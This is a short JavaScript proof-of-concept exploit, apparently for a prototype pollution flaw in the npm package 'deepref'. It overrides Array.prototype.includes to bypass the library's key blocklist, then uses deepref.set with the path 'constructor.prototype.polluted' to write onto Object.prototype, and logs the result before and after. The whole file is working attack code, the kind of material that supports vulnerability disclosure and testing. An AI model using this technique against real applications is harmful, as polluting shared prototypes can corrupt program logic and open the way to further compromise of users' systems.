Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
const deepref = require('deepref');
deepref.set({}, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);